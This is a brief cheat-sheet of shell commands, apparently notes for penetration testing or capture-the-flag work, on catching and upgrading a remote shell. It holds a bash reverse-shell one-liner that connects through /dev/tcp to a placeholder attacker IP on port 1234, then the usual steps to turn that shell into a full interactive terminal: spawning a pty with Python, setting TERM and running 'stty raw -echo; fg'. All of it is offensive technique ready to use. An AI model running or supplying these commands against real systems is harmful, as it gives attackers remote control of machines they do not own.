# Reverse shell connection attempt
("bash -c 'bash -i >& /dev/tcp/[##Your Local IP Address##]/1234 0>&1'");

# This script uses Python to import pty and spawn an interactive shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Set the TERM environment variable to xterm
export TERM=xterm

# Set terminal settings and bring the backgrounded (ctrl + Z) process to the foreground
stty raw -echo; fg
